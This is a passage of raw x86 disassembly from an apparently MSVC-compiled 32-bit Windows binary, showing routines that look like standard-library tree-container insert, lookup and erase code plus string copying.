   15e47:	push   ecx
   15e48:	push   esi
   15e49:	mov    esi,ecx
   15e4b:	cmp    esi,DWORD PTR [ebp+0x8]
   15e4e:	je     0x15e6c
   15e50:	mov    eax,DWORD PTR [esi+0x4]
   15e53:	mov    ecx,DWORD PTR [eax]
   15e55:	push   eax
   15e56:	push   ecx
   15e57:	lea    eax,[ebp-0x4]
   15e5a:	push   eax
   15e5b:	mov    ecx,esi
   15e5d:	call   0x14d6a
   15e62:	push   DWORD PTR [ebp+0x8]
   15e65:	mov    ecx,esi
   15e67:	call   0x14b62
   15e6c:	mov    eax,esi
   15e6e:	pop    esi
   15e6f:	leave  
   15e70:	ret    0x4
   15e73:	int3   
   15e74:	int3   
   15e75:	int3   
   15e76:	int3   
   15e77:	int3   
   15e78:	mov    edi,edi
   15e7a:	push   ebp
   15e7b:	mov    ebp,esp
   15e7d:	push   ecx
   15e7e:	push   ebx
   15e7f:	push   esi
   15e80:	push   edi
   15e81:	xor    edi,edi
   15e83:	push   edi
   15e84:	push   edi
   15e85:	push   edi
   15e86:	mov    esi,ecx
   15e88:	mov    eax,DWORD PTR [esi+0x10]
   15e8b:	push   edi
   15e8c:	push   eax
   15e8d:	xor    ebx,ebx
   15e8f:	call   DWORD PTR ds:0x1f028
   15e95:	test   eax,eax
   15e97:	jge    0x15e9d
   15e99:	xor    eax,eax
   15e9b:	jmp    0x15ec3
   15e9d:	lea    eax,[ebp+0x8]
   15ea0:	push   eax
   15ea1:	lea    eax,[ebp-0x4]
   15ea4:	push   eax
   15ea5:	mov    ecx,esi
   15ea7:	call   0x13bfa
   15eac:	mov    eax,DWORD PTR [ebp-0x4]
   15eaf:	cmp    eax,DWORD PTR [esi+0x4]
   15eb2:	je     0x15eb7
   15eb4:	mov    ebx,DWORD PTR [eax+0x10]
   15eb7:	push   edi
   15eb8:	push   DWORD PTR [esi+0x10]
   15ebb:	call   DWORD PTR ds:0x1f024
   15ec1:	mov    eax,ebx
   15ec3:	pop    edi
   15ec4:	pop    esi
   15ec5:	pop    ebx
   15ec6:	leave  
   15ec7:	ret    0x4
   15eca:	int3   
   15ecb:	int3   
   15ecc:	int3   
   15ecd:	int3   
   15ece:	int3   
   15ecf:	int3   
   15ed0:	push   0x10
   15ed2:	push   0x7df08
   15ed7:	call   0x1db1c
   15edc:	xor    ebx,ebx
   15ede:	push   ebx
   15edf:	push   ebx
   15ee0:	push   ebx
   15ee1:	push   ebx
   15ee2:	push   0x7eb70
   15ee7:	call   DWORD PTR ds:0x1f028
   15eed:	cmp    eax,ebx
   15eef:	jl     0x15fac
   15ef5:	mov    DWORD PTR [ebp-0x4],ebx
   15ef8:	push   0xffffffff
   15efa:	push   0x1df30
   15eff:	lea    ecx,[ebp-0x20]
   15f02:	call   0x110ae
   15f07:	mov    esi,DWORD PTR [ebp+0x8]
   15f0a:	push   esi
   15f0b:	lea    eax,[ebp+0x8]
   15f0e:	push   eax
   15f0f:	mov    ecx,DWORD PTR ds:0x7eb40
   15f15:	call   0x14bee
   15f1a:	mov    eax,ds:0x7eb40
   15f1f:	mov    eax,DWORD PTR [eax+0x4]
   15f22:	mov    ecx,DWORD PTR [ebp+0x8]
   15f25:	cmp    ecx,eax
   15f27:	je     0x15f35
   15f29:	add    ecx,0x14
   15f2c:	push   ecx
   15f2d:	lea    ecx,[ebp-0x20]
   15f30:	call   0x129cc
   15f35:	mov    edx,DWORD PTR [esi+0x4]
   15f38:	mov    eax,DWORD PTR [ebp-0x1c]
   15f3b:	lea    ecx,[eax+edx*1+0x2]
   15f3f:	mov    eax,DWORD PTR [ebp+0xc]
   15f42:	cmp    ecx,DWORD PTR [eax]
   15f44:	jbe    0x15f51
   15f46:	mov    DWORD PTR [eax],ecx
   15f48:	mov    DWORD PTR [eax+0x8],0x2
   15f4f:	jmp    0x15f74
   15f51:	mov    DWORD PTR [eax+0x8],ebx
   15f54:	mov    esi,DWORD PTR [esi]
   15f56:	lea    edi,[eax+0xc]
   15f59:	mov    cl,BYTE PTR [esi]
   15f5b:	mov    BYTE PTR [edi],cl
   15f5d:	inc    esi
   15f5e:	inc    edi
   15f5f:	cmp    cl,bl
   15f61:	jne    0x15f59
   15f63:	mov    esi,DWORD PTR [ebp-0x20]
   15f66:	lea    eax,[edx+eax*1+0xd]
   15f6a:	mov    cl,BYTE PTR [esi]
   15f6c:	mov    BYTE PTR [eax],cl
   15f6e:	inc    esi
   15f6f:	inc    eax
   15f70:	cmp    cl,bl
   15f72:	jne    0x15f6a
   15f74:	push   DWORD PTR [ebp-0x20]
   15f77:	call   0x10a9a
   15f7c:	pop    ecx
   15f7d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15f84:	jmp    0x15fa0
   15f86:	xor    eax,eax
   15f88:	inc    eax
   15f89:	ret    
   15f8a:	mov    esp,DWORD PTR [ebp-0x18]
   15f8d:	mov    eax,DWORD PTR [ebp+0xc]
   15f90:	mov    DWORD PTR [eax+0x8],0x4
   15f97:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   15f9e:	xor    ebx,ebx
   15fa0:	push   ebx
   15fa1:	push   0x7eb70
   15fa6:	call   DWORD PTR ds:0x1f024
   15fac:	call   0x1db61
   15fb1:	ret    0x8
   15fb4:	int3   
   15fb5:	int3   
   15fb6:	int3   
   15fb7:	int3   
   15fb8:	int3   
   15fb9:	int3   
   15fba:	push   0xc
   15fbc:	push   0x7df28
   15fc1:	call   0x1db1c
   15fc6:	xor    edi,edi
   15fc8:	push   edi
   15fc9:	push   edi
   15fca:	push   edi
   15fcb:	push   edi
   15fcc:	push   0x7eb70
   15fd1:	call   DWORD PTR ds:0x1f028
   15fd7:	cmp    eax,edi
   15fd9:	jl     0x16088
   15fdf:	mov    DWORD PTR [ebp-0x4],edi
   15fe2:	lea    eax,[ebp+0x8]
   15fe5:	push   eax
   15fe6:	lea    eax,[ebp-0x1c]
   15fe9:	push   eax
   15fea:	mov    esi,DWORD PTR ds:0x7ebcc
   15ff0:	mov    ecx,esi
   15ff2:	call   0x13ccc
   15ff7:	mov    esi,DWORD PTR [esi+0x4]
   15ffa:	mov    ecx,DWORD PTR [ebp-0x1c]
   15ffd:	cmp    ecx,esi
   15fff:	jne    0x1600d
   16001:	mov    eax,DWORD PTR [ebp+0xc]
   16004:	mov    DWORD PTR [eax+0x8],0x1
   1600b:	jmp    0x16059
   1600d:	mov    eax,DWORD PTR [ecx+0x10]
   16010:	cmp    eax,edi
   16012:	jne    0x16018
   16014:	xor    edx,edx
   16016:	jmp    0x1601b
   16018:	mov    edx,DWORD PTR [eax+0x8]
   1601b:	mov    eax,DWORD PTR [ebp+0xc]
   1601e:	cmp    edx,DWORD PTR [eax]
   16020:	jbe    0x1602d
   16022:	mov    DWORD PTR [eax],edx
   16024:	mov    DWORD PTR [eax+0x8],0x2
   1602b:	jmp    0x16059
   1602d:	mov    DWORD PTR [eax+0x8],edi
   16030:	mov    edx,DWORD PTR [ecx+0x10]
   16033:	cmp    edx,edi
   16035:	jne    0x1603b
   16037:	xor    edx,edx
   16039:	jmp    0x1603e
   1603b:	mov    edx,DWORD PTR [edx+0x8]
   1603e:	mov    ecx,DWORD PTR [ecx+0x10]
   16041:	cmp    ecx,edi
   16043:	jne    0x16049
   16045:	xor    ecx,ecx
   16047:	jmp    0x1604b
   16049:	mov    ecx,DWORD PTR [ecx]
   1604b:	push   edx
   1604c:	push   ecx
   1604d:	add    eax,0xc
   16050:	push   eax
   16051:	call   0x1dade
   16056:	add    esp,0xc
   16059:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16060:	jmp    0x1607c
   16062:	xor    eax,eax
   16064:	inc    eax
   16065:	ret    
   16066:	mov    esp,DWORD PTR [ebp-0x18]
   16069:	mov    eax,DWORD PTR [ebp+0xc]
   1606c:	mov    DWORD PTR [eax+0x8],0x4
   16073:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   1607a:	xor    edi,edi
   1607c:	push   edi
   1607d:	push   0x7eb70
   16082:	call   DWORD PTR ds:0x1f024
   16088:	call   0x1db61
   1608d:	ret    0x8
   16090:	int3   
   16091:	int3   
   16092:	int3   
   16093:	int3   
   16094:	int3   
   16095:	int3   
   16096:	mov    edi,edi
   16098:	push   ebp
   16099:	mov    ebp,esp
   1609b:	push   ebx
   1609c:	push   esi
   1609d:	push   DWORD PTR [ebp+0x8]
   160a0:	mov    esi,ecx
   160a2:	lea    eax,[ebp+0x8]
   160a5:	push   eax
   160a6:	lea    ecx,[esi+0x4]
   160a9:	xor    bl,bl
   160ab:	call   0x13d2e
   160b0:	mov    eax,DWORD PTR [ebp+0x8]
   160b3:	cmp    eax,DWORD PTR [esi+0x8]
   160b6:	je     0x160c6
   160b8:	mov    ecx,DWORD PTR [ebp+0xc]
   160bb:	add    eax,0x18
   160be:	push   eax
   160bf:	call   0x12a5a
   160c4:	inc    bl
   160c6:	pop    esi
   160c7:	mov    al,bl
   160c9:	pop    ebx
   160ca:	pop    ebp
   160cb:	ret    0x8
   160ce:	int3   
   160cf:	int3   
   160d0:	int3   
   160d1:	int3   
   160d2:	int3   
   160d3:	int3   
   160d4:	mov    edi,edi
   160d6:	push   ebp
   160d7:	mov    ebp,esp
   160d9:	push   ecx
   160da:	push   ecx
   160db:	push   DWORD PTR [ebp+0xc]
   160de:	lea    eax,[ebp-0x8]
   160e1:	push   eax
   160e2:	call   0x14cd2
   160e7:	mov    eax,DWORD PTR [ebp+0x8]
   160ea:	mov    ecx,DWORD PTR [ebp-0x8]
   160ed:	mov    DWORD PTR [eax],ecx
   160ef:	mov    cl,BYTE PTR [ebp-0x4]
   160f2:	mov    BYTE PTR [eax+0x4],cl
   160f5:	leave  
   160f6:	ret    0x8
   160f9:	int3   
   160fa:	int3   
   160fb:	int3   
   160fc:	int3   
   160fd:	int3   
   160fe:	mov    edi,edi
   16100:	push   ebp
   16101:	mov    ebp,esp
   16103:	push   ecx
   16104:	push   esi
   16105:	mov    esi,ecx
   16107:	mov    eax,DWORD PTR [esi+0x4]
   1610a:	mov    ecx,DWORD PTR [eax]
   1610c:	push   eax
   1610d:	push   ecx
   1610e:	lea    eax,[ebp-0x4]
   16111:	push   eax
   16112:	mov    ecx,esi
   16114:	call   0x14d6a
   16119:	push   DWORD PTR [esi+0x4]
   1611c:	call   0x10a9a
   16121:	xor    eax,eax
   16123:	mov    DWORD PTR [esi+0x4],eax
   16126:	mov    DWORD PTR [esi+0xc],eax
   16129:	dec    DWORD PTR ds:0x7f830
   1612f:	pop    ecx
   16130:	pop    esi
   16131:	jne    0x16149
   16133:	mov    ecx,DWORD PTR ds:0x7f6cc
   16139:	mov    ds:0x7f6cc,eax
   1613e:	cmp    ecx,eax
   16140:	je     0x16149
   16142:	push   ecx
   16143:	call   0x10a9a
   16148:	pop    ecx
   16149:	leave  
   1614a:	ret    
   1614b:	int3   
   1614c:	int3   
   1614d:	int3   
   1614e:	int3   
   1614f:	int3   
   16150:	mov    edi,edi
   16152:	push   ebp
   16153:	mov    ebp,esp
   16155:	push   ecx
   16156:	push   ecx
   16157:	push   DWORD PTR [ebp+0xc]
   1615a:	lea    eax,[ebp-0x8]
   1615d:	push   eax
   1615e:	call   0x14e32
   16163:	mov    eax,DWORD PTR [ebp+0x8]
   16166:	mov    ecx,DWORD PTR [ebp-0x8]
   16169:	mov    DWORD PTR [eax],ecx
   1616b:	mov    cl,BYTE PTR [ebp-0x4]
   1616e:	mov    BYTE PTR [eax+0x4],cl
   16171:	leave  
   16172:	ret    0x8
   16175:	int3   
   16176:	int3   
   16177:	int3   
   16178:	int3   
   16179:	int3   
   1617a:	mov    edi,edi
   1617c:	push   ebp
   1617d:	mov    ebp,esp
   1617f:	push   ecx
   16180:	push   ecx
   16181:	push   DWORD PTR [ebp+0x8]
   16184:	lea    eax,[ebp-0x8]
   16187:	push   eax
   16188:	call   0x14062
   1618d:	and    DWORD PTR [ebp+0x8],0x0
   16191:	lea    eax,[ebp+0x8]
   16194:	push   eax
   16195:	push   DWORD PTR [ebp-0x4]
   16198:	push   DWORD PTR [ebp-0x8]
   1619b:	call   0x15df4
   161a0:	mov    eax,DWORD PTR [ebp+0x8]
   161a3:	add    esp,0xc
   161a6:	leave  
   161a7:	ret    0x4
   161aa:	int3   
   161ab:	int3   
   161ac:	int3   
   161ad:	int3   
   161ae:	int3   
   161af:	int3   
   161b0:	mov    edi,edi
   161b2:	push   ebp
   161b3:	mov    ebp,esp
   161b5:	push   ecx
   161b6:	push   ecx
   161b7:	push   esi
   161b8:	push   DWORD PTR [ebp+0x8]
   161bb:	lea    eax,[ebp-0x8]
   161be:	push   eax
   161bf:	mov    esi,ecx
   161c1:	call   0x140f6
   161c6:	and    DWORD PTR [ebp+0x8],0x0
   161ca:	lea    eax,[ebp+0x8]
   161cd:	push   eax
   161ce:	push   DWORD PTR [ebp-0x4]
   161d1:	push   DWORD PTR [ebp-0x8]
   161d4:	call   0x13a5e
   161d9:	add    esp,0xc
   161dc:	push   DWORD PTR [ebp-0x4]
   161df:	lea    eax,[ebp-0x4]
   161e2:	push   DWORD PTR [ebp-0x8]
   161e5:	mov    ecx,esi
   161e7:	push   eax
   161e8:	call   0x14eca
   161ed:	mov    eax,DWORD PTR [ebp+0x8]
   161f0:	pop    esi
   161f1:	leave  
   161f2:	ret    0x4
   161f5:	int3   
   161f6:	int3   
   161f7:	int3   
   161f8:	int3   
   161f9:	int3   
   161fa:	mov    edi,edi
   161fc:	push   ebp
   161fd:	mov    ebp,esp
   161ff:	push   ecx
   16200:	push   ebx
   16201:	push   esi
   16202:	push   edi
   16203:	mov    edi,ecx
   16205:	mov    eax,DWORD PTR [edi+0x4]
   16208:	mov    esi,DWORD PTR [eax+0x4]
   1620b:	mov    ebx,eax
   1620d:	mov    al,0x1
   1620f:	jmp    0x1622a
   16211:	lea    eax,[esi+0x10]
   16214:	push   eax
   16215:	push   DWORD PTR [ebp+0xc]
   16218:	mov    ebx,esi
   1621a:	call   0x19804
   1621f:	test   al,al
   16221:	je     0x16227
   16223:	mov    esi,DWORD PTR [esi]
   16225:	jmp    0x1622a
   16227:	mov    esi,DWORD PTR [esi+0x8]
   1622a:	cmp    esi,DWORD PTR ds:0x7f6d0
   16230:	jne    0x16211
   16232:	cmp    BYTE PTR [edi+0x8],0x0
   16236:	je     0x16253
   16238:	push   DWORD PTR [ebp+0xc]
   1623b:	lea    eax,[ebp+0xc]
   1623e:	push   ebx
   1623f:	push   esi
   16240:	push   eax
   16241:	mov    ecx,edi
   16243:	call   0x151f4
   16248:	mov    ecx,DWORD PTR [eax]
   1624a:	mov    eax,DWORD PTR [ebp+0x8]
   1624d:	mov    BYTE PTR [eax+0x4],0x1
   16251:	jmp    0x16286
   16253:	mov    DWORD PTR [ebp-0x4],ebx
   16256:	test   al,al
   16258:	je     0x16269
   1625a:	mov    eax,DWORD PTR [edi+0x4]
   1625d:	cmp    ebx,DWORD PTR [eax]
   1625f:	je     0x16238
   16261:	lea    ecx,[ebp-0x4]
   16264:	call   0x11508
   16269:	push   DWORD PTR [ebp+0xc]
   1626c:	mov    eax,DWORD PTR [ebp-0x4]
   1626f:	add    eax,0x10
   16272:	push   eax
   16273:	call   0x19804
   16278:	test   al,al
   1627a:	jne    0x16238
   1627c:	mov    eax,DWORD PTR [ebp+0x8]
   1627f:	mov    ecx,DWORD PTR [ebp-0x4]
   16282:	mov    BYTE PTR [eax+0x4],0x0
   16286:	pop    edi
   16287:	pop    esi
   16288:	mov    DWORD PTR [eax],ecx
   1628a:	pop    ebx
   1628b:	leave  
   1628c:	ret    0x8
   1628f:	int3   
   16290:	int3   
   16291:	int3   
   16292:	int3   
   16293:	int3   
   16294:	mov    edi,edi
   16296:	push   ebp
   16297:	mov    ebp,esp
   16299:	push   ecx
   1629a:	push   esi
   1629b:	mov    esi,ecx
   1629d:	cmp    DWORD PTR [esi+0xc],0x0
   162a1:	mov    ecx,DWORD PTR [ebp+0xc]
   162a4:	je     0x162de
   162a6:	mov    eax,DWORD PTR [esi+0x4]
   162a9:	cmp    ecx,DWORD PTR [eax]
   162ab:	jne    0x162de
   162ad:	cmp    DWORD PTR [ebp+0x10],eax
   162b0:	jne    0x162de
   162b2:	push   DWORD PTR [eax+0x4]
   162b5:	mov    ecx,esi
   162b7:	call   0x151aa
   162bc:	mov    ecx,DWORD PTR ds:0x7f6d0
   162c2:	mov    eax,DWORD PTR [esi+0x4]
   162c5:	mov    DWORD PTR [eax+0x4],ecx
   162c8:	mov    eax,DWORD PTR [esi+0x4]
   162cb:	and    DWORD PTR [esi+0xc],0x0
   162cf:	mov    DWORD PTR [eax],eax
   162d1:	mov    eax,DWORD PTR [esi+0x4]
   162d4:	mov    DWORD PTR [eax+0x8],eax
   162d7:	mov    eax,DWORD PTR [esi+0x4]
   162da:	mov    ecx,DWORD PTR [eax]
   162dc:	jmp    0x16303
   162de:	cmp    ecx,DWORD PTR [ebp+0x10]
   162e1:	je     0x16303
   162e3:	push   edi
   162e4:	mov    edi,ecx
   162e6:	lea    ecx,[ebp+0xc]
   162e9:	call   0x12ec0
   162ee:	push   edi
   162ef:	lea    eax,[ebp-0x4]
   162f2:	push   eax
   162f3:	mov    ecx,esi
   162f5:	call   0x14f48
   162fa:	mov    ecx,DWORD PTR [ebp+0xc]
   162fd:	cmp    ecx,DWORD PTR [ebp+0x10]
   16300:	jne    0x162e4
   16302:	pop    edi
   16303:	mov    eax,DWORD PTR [ebp+0x8]
   16306:	mov    DWORD PTR [eax],ecx
   16308:	pop    esi
   16309:	leave  
   1630a:	ret    0xc
   1630d:	int3   
   1630e:	int3   
   1630f:	int3   
   16310:	int3   
   16311:	int3   
   16312:	mov    edi,edi
   16314:	push   ebp
   16315:	mov    ebp,esp
   16317:	push   ecx
   16318:	push   ebx
   16319:	push   esi
   1631a:	push   edi
   1631b:	mov    edi,ecx
   1631d:	mov    eax,DWORD PTR [edi+0x4]
   16320:	mov    esi,DWORD PTR [eax+0x4]
   16323:	mov    ebx,eax
   16325:	mov    al,0x1
   16327:	jmp    0x16342
   16329:	lea    eax,[esi+0x10]
   1632c:	push   eax
   1632d:	push   DWORD PTR [ebp+0xc]
   16330:	mov    ebx,esi
   16332:	call   0x19804
   16337:	test   al,al
   16339:	je     0x1633f
   1633b:	mov    esi,DWORD PTR [esi]
   1633d:	jmp    0x16342
   1633f:	mov    esi,DWORD PTR [esi+0x8]
   16342:	cmp    esi,DWORD PTR ds:0x7f6d4
   16348:	jne    0x16329
   1634a:	cmp    BYTE PTR [edi+0x8],0x0
   1634e:	je     0x1636b
   16350:	push   DWORD PTR [ebp+0xc]
   16353:	lea    eax,[ebp+0xc]
   16356:	push   ebx
   16357:	push   esi
   16358:	push   eax
   16359:	mov    ecx,edi
   1635b:	call   0x155f6
   16360:	mov    ecx,DWORD PTR [eax]
   16362:	mov    eax,DWORD PTR [ebp+0x8]
   16365:	mov    BYTE PTR [eax+0x4],0x1
   16369:	jmp    0x1639e
   1636b:	mov    DWORD PTR [ebp-0x4],ebx
   1636e:	test   al,al
   16370:	je     0x16381
   16372:	mov    eax,DWORD PTR [edi+0x4]
   16375:	cmp    ebx,DWORD PTR [eax]
   16377:	je     0x16350
   16379:	lea    ecx,[ebp-0x4]
   1637c:	call   0x113c0
   16381:	push   DWORD PTR [ebp+0xc]
   16384:	mov    eax,DWORD PTR [ebp-0x4]
   16387:	add    eax,0x10
   1638a:	push   eax
   1638b:	call   0x19804
   16390:	test   al,al
   16392:	jne    0x16350
   16394:	mov    eax,DWORD PTR [ebp+0x8]
   16397:	mov    ecx,DWORD PTR [ebp-0x4]
   1639a:	mov    BYTE PTR [eax+0x4],0x0
   1639e:	pop    edi
   1639f:	pop    esi
   163a0:	mov    DWORD PTR [eax],ecx
   163a2:	pop    ebx
   163a3:	leave  
   163a4:	ret    0x8
   163a7:	int3   
   163a8:	int3   
   163a9:	int3   
   163aa:	int3   
   163ab:	int3   
   163ac:	mov    edi,edi
   163ae:	push   ebp
   163af:	mov    ebp,esp
   163b1:	push   ecx
   163b2:	push   esi
   163b3:	mov    esi,ecx
   163b5:	cmp    DWORD PTR [esi+0xc],0x0
   163b9:	mov    ecx,DWORD PTR [ebp+0xc]
   163bc:	je     0x163f6
   163be:	mov    eax,DWORD PTR [esi+0x4]
   163c1:	cmp    ecx,DWORD PTR [eax]
   163c3:	jne    0x163f6
   163c5:	cmp    DWORD PTR [ebp+0x10],eax
   163c8:	jne    0x163f6
   163ca:	push   DWORD PTR [eax+0x4]
   163cd:	mov    ecx,esi
   163cf:	call   0x155ac
   163d4:	mov    ecx,DWORD PTR ds:0x7f6d4
   163da:	mov    eax,DWORD PTR [esi+0x4]
   163dd:	mov    DWORD PTR [eax+0x4],ecx
   163e0:	mov    eax,DWORD PTR [esi+0x4]
   163e3:	and    DWORD PTR [esi+0xc],0x0
   163e7:	mov    DWORD PTR [eax],eax
   163e9:	mov    eax,DWORD PTR [esi+0x4]
   163ec:	mov    DWORD PTR [eax+0x8],eax
   163ef:	mov    eax,DWORD PTR [esi+0x4]
   163f2:	mov    ecx,DWORD PTR [eax]
   163f4:	jmp    0x1641b
   163f6:	cmp    ecx,DWORD PTR [ebp+0x10]
   163f9:	je     0x1641b
   163fb:	push   edi
   163fc:	mov    edi,ecx
   163fe:	lea    ecx,[ebp+0xc]
   16401:	call   0x1387e
   16406:	push   edi
   16407:	lea    eax,[ebp-0x4]
   1640a:	push   eax
   1640b:	mov    ecx,esi
   1640d:	call   0x1534a
   16412:	mov    ecx,DWORD PTR [ebp+0xc]
   16415:	cmp    ecx,DWORD PTR [ebp+0x10]
   16418:	jne    0x163fc
   1641a:	pop    edi
   1641b:	mov    eax,DWORD PTR [ebp+0x8]
   1641e:	mov    DWORD PTR [eax],ecx
   16420:	pop    esi
   16421:	leave  
   16422:	ret    0xc
   16425:	int3   
   16426:	int3   
   16427:	int3   
   16428:	int3   
   16429:	int3   
   1642a:	mov    edi,edi
   1642c:	push   ebp
   1642d:	mov    ebp,esp
   1642f:	push   ecx
   16430:	push   ebx
   16431:	push   esi
   16432:	push   edi
   16433:	mov    edi,ecx
   16435:	mov    eax,DWORD PTR [edi+0x4]
   16438:	mov    esi,DWORD PTR [eax+0x4]
   1643b:	mov    ebx,eax
   1643d:	mov    al,0x1
   1643f:	jmp    0x1645a
   16441:	lea    eax,[esi+0xc]
   16444:	push   eax
   16445:	push   DWORD PTR [ebp+0xc]
   16448:	mov    ebx,esi
   1644a:	call   0x19804
   1644f:	test   al,al
   16451:	je     0x16457
   16453:	mov    esi,DWORD PTR [esi]
   16455:	jmp    0x1645a
   16457:	mov    esi,DWORD PTR [esi+0x8]
   1645a:	cmp    esi,DWORD PTR ds:0x7f6d8
   16460:	jne    0x16441
   16462:	cmp    BYTE PTR [edi+0x8],0x0
   16466:	je     0x16483
   16468:	push   DWORD PTR [ebp+0xc]
   1646b:	lea    eax,[ebp+0xc]
   1646e:	push   ebx
   1646f:	push   esi
   16470:	push   eax
   16471:	mov    ecx,edi
   16473:	call   0x1574c
   16478:	mov    ecx,DWORD PTR [eax]
   1647a:	mov    eax,DWORD PTR [ebp+0x8]
   1647d:	mov    BYTE PTR [eax+0x4],0x1
   16481:	jmp    0x164b6
   16483:	mov    DWORD PTR [ebp-0x4],ebx
   16486:	test   al,al
   16488:	je     0x16499
   1648a:	mov    eax,DWORD PTR [edi+0x4]
   1648d:	cmp    ebx,DWORD PTR [eax]
   1648f:	je     0x16468
   16491:	lea    ecx,[ebp-0x4]
   16494:	call   0x11444
   16499:	push   DWORD PTR [ebp+0xc]
   1649c:	mov    eax,DWORD PTR [ebp-0x4]
   1649f:	add    eax,0xc
   164a2:	push   eax
   164a3:	call   0x19804
   164a8:	test   al,al
   164aa:	jne    0x16468
   164ac:	mov    eax,DWORD PTR [ebp+0x8]
   164af:	mov    ecx,DWORD PTR [ebp-0x4]
   164b2:	mov    BYTE PTR [eax+0x4],0x0
   164b6:	pop    edi
   164b7:	pop    esi
   164b8:	mov    DWORD PTR [eax],ecx
   164ba:	pop    ebx
   164bb:	leave  
   164bc:	ret    0x8
   164bf:	int3   
   164c0:	int3   
   164c1:	int3   
   164c2:	int3   
   164c3:	int3   
   164c4:	mov    edi,edi
   164c6:	push   ebp
   164c7:	mov    ebp,esp
   164c9:	push   ecx
   164ca:	push   ebx
   164cb:	push   esi
   164cc:	push   edi
   164cd:	mov    edi,ecx
   164cf:	mov    eax,DWORD PTR [edi+0x4]
   164d2:	mov    esi,DWORD PTR [eax+0x4]
   164d5:	mov    ebx,eax
   164d7:	mov    eax,ds:0x7f6dc
   164dc:	mov    dl,0x1
   164de:	cmp    esi,eax
   164e0:	je     0x164fe
   164e2:	mov    ecx,DWORD PTR [ebp+0xc]
   164e5:	mov    ecx,DWORD PTR [ecx]
   164e7:	cmp    ecx,DWORD PTR [esi+0xc]
   164ea:	mov    ebx,esi
   164ec:	setl   dl
   164ef:	test   dl,dl
   164f1:	je     0x164f7
   164f3:	mov    esi,DWORD PTR [esi]
   164f5:	jmp    0x164fa
   164f7:	mov    esi,DWORD PTR [esi+0x8]
   164fa:	cmp    esi,eax
   164fc:	jne    0x164e7
   164fe:	cmp    BYTE PTR [edi+0x8],0x0
   16502:	je     0x1651f
   16504:	push   DWORD PTR [ebp+0xc]
   16507:	push   ebx
   16508:	push   esi
   16509:	lea    eax,[ebp+0xc]
   1650c:	push   eax
   1650d:	mov    ecx,edi
   1650f:	call   0x15b4e
   16514:	mov    ecx,DWORD PTR [eax]
   16516:	mov    eax,DWORD PTR [ebp+0x8]
   16519:	mov    BYTE PTR [eax+0x4],0x1
   1651d:	jmp    0x1654e
   1651f:	mov    ecx,ebx
   16521:	mov    DWORD PTR [ebp-0x4],ecx
   16524:	test   dl,dl
   16526:	je     0x1653a
   16528:	mov    eax,DWORD PTR [edi+0x4]
   1652b:	cmp    ebx,DWORD PTR [eax]
   1652d:	je     0x16504
   1652f:	lea    ecx,[ebp-0x4]
   16532:	call   0x114c8
   16537:	mov    ecx,DWORD PTR [ebp-0x4]
   1653a:	mov    edx,DWORD PTR [ecx+0xc]
   1653d:	mov    eax,DWORD PTR [ebp+0xc]
   16540:	cmp    edx,DWORD PTR [eax]
   16542:	jge    0x16547
   16544:	push   eax
   16545:	jmp    0x16507
   16547:	mov    eax,DWORD PTR [ebp+0x8]
   1654a:	mov    BYTE PTR [eax+0x4],0x0
   1654e:	pop    edi
   1654f:	pop    esi
   16550:	mov    DWORD PTR [eax],ecx
   16552:	pop    ebx
   16553:	leave  
   16554:	ret    0x8
   16557:	int3   
   16558:	int3   
   16559:	int3   
   1655a:	int3   
   1655b:	int3   
   1655c:	mov    edi,edi
   1655e:	push   ebp
   1655f:	mov    ebp,esp
   16561:	push   ecx
   16562:	push   esi
   16563:	mov    esi,ecx
   16565:	cmp    DWORD PTR [esi+0xc],0x0
   16569:	mov    ecx,DWORD PTR [ebp+0xc]
   1656c:	je     0x165a6
   1656e:	mov    eax,DWORD PTR [esi+0x4]
   16571:	cmp    ecx,DWORD PTR [eax]
   16573:	jne    0x165a6
   16575:	cmp    DWORD PTR [ebp+0x10],eax
   16578:	jne    0x165a6
   1657a:	push   DWORD PTR [eax+0x4]
   1657d:	mov    ecx,esi
   1657f:	call   0x15b04
   16584:	mov    ecx,DWORD PTR ds:0x7f6dc
   1658a:	mov    eax,DWORD PTR [esi+0x4]
   1658d:	mov    DWORD PTR [eax+0x4],ecx
   16590:	mov    eax,DWORD PTR [esi+0x4]
   16593:	and    DWORD PTR [esi+0xc],0x0
   16597:	mov    DWORD PTR [eax],eax
   16599:	mov    eax,DWORD PTR [esi+0x4]
   1659c:	mov    DWORD PTR [eax+0x8],eax
   1659f:	mov    eax,DWORD PTR [esi+0x4]
   165a2:	mov    ecx,DWORD PTR [eax]
   165a4:	jmp    0x165cb
   165a6:	cmp    ecx,DWORD PTR [ebp+0x10]
   165a9:	je     0x165cb
   165ab:	push   edi
   165ac:	mov    edi,ecx
   165ae:	lea    ecx,[ebp+0xc]
   165b1:	call   0x1157e
   165b6:	push   edi
   165b7:	lea    eax,[ebp-0x4]
   165ba:	push   eax
   165bb:	mov    ecx,esi
   165bd:	call   0x158a2
   165c2:	mov    ecx,DWORD PTR [ebp+0xc]
   165c5:	cmp    ecx,DWORD PTR [ebp+0x10]
   165c8:	jne    0x165ac
   165ca:	pop    edi
   165cb:	mov    eax,DWORD PTR [ebp+0x8]
   165ce:	mov    DWORD PTR [eax],ecx
   165d0:	pop    esi
   165d1:	leave  
   165d2:	ret    0xc
   165d5:	int3   
   165d6:	int3   
   165d7:	int3   
   165d8:	int3   
   165d9:	int3   
   165da:	mov    edi,edi
   165dc:	push   ebp
   165dd:	mov    ebp,esp
   165df:	push   ecx
   165e0:	push   ebx
   165e1:	push   esi
   165e2:	push   edi
   165e3:	mov    edi,ecx
   165e5:	mov    eax,DWORD PTR [edi+0x4]
   165e8:	mov    esi,DWORD PTR [eax+0x4]
   165eb:	mov    ebx,eax
   165ed:	mov    al,0x1
   165ef:	jmp    0x1660a
   165f1:	lea    eax,[esi+0xc]
   165f4:	push   eax
   165f5:	push   DWORD PTR [ebp+0xc]
   165f8:	mov    ebx,esi
   165fa:	call   0x19834
   165ff:	test   al,al
   16601:	je     0x16607
   16603:	mov    esi,DWORD PTR [esi]
   16605:	jmp    0x1660a
   16607:	mov    esi,DWORD PTR [esi+0x8]
   1660a:	cmp    esi,DWORD PTR ds:0x7f6e4
   16610:	jne    0x165f1
   16612:	cmp    BYTE PTR [edi+0x8],0x0
   16616:	je     0x16633
   16618:	push   DWORD PTR [ebp+0xc]
   1661b:	lea    eax,[ebp+0xc]
   1661e:	push   ebx
   1661f:	push   esi
   16620:	push   eax
   16621:	mov    ecx,edi
